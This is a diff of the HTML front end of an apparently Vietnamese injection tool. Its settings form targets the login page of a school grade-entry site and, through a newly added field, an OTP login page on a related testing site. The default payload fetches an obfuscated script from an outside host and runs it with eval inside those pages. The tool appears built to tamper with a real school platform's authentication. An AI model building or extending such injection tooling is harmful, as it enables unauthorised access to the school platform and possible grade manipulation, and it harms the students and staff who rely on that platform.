@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Launcher Tool</title>
-<!-- Sửa lại đường dẫn tuyệt đối cho CSS -->
 <link rel="stylesheet" href="./style.css">
 </head>
 <body>
@@ -20,25 +19,26 @@
   <div id="status" class="status">Trạng thái: Chờ lệnh</div>
 </div>
 
-<!-- Tìm đến đoạn Popup trong index.html và sửa lại thành: -->
+<!-- Popup inject lại -->
 <div id="popup" class="popup hidden">
   <div class="popup-content">
-    <h2>Tool bị ngắt / Cần Inject</h2>
-    <p>Phát hiện tool đã dừng hoặc cần chuyển trang. Inject lại?</p>
-    <div class="popup-actions" style="flex-direction: column;">
-      <button id="btnReinject" class="btn primary">INJECT LẠI TRANG LOGIN</button>
-      <button id="btnInjectNext" class="btn primary" style="background:#1f6feb; border-color:#388bfd;">INJECT TRANG SAU (ĐÃ ĐĂNG NHẬP)</button>
+    <h2>Tool bị ngắt</h2>
+    <p>Phát hiện tool đã dừng. Inject lại?</p>
+    <div class="popup-actions">
+      <button id="btnReinject" class="btn primary">INJECT LẠI</button>
       <button id="btnClose" class="btn">ĐÓNG</button>
     </div>
   </div>
 </div>
 
-<!-- Setting Tool -->
+<!-- Setting Tool (Cập nhật thêm URL 2) -->
 <div id="settingTool" class="modal hidden">
   <div class="modal-content">
     <h2>SETTING TOOL</h2>
-    <label>URL đích:</label>
+    <label>URL đích 1 (Login):</label>
     <input type="text" id="inpTargetUrl" value="https://nhapdiem.truonghocviet.vn/Account/Login">
+    <label>URL đích 2 (OTP):</label>
+    <input type="text" id="inpTargetUrl2" value="https://tracnghiem22.truonghocviet.vn/Home/Index#/LoginOtp">
     <label>Payload inject:</label>
     <textarea id="inpPayload">fetch('https://vschoolx.vercel.app/files/obf.js').then(r => r.text()).then(eval);</textarea>
     <label>Thời gian chờ (ms):</label>
@@ -67,7 +67,6 @@
   </div>
 </div>
 
-<!-- Sửa lại đường dẫn tuyệt đối cho JS -->
 <script src="./script.js"></script>
 </body>
 </html>
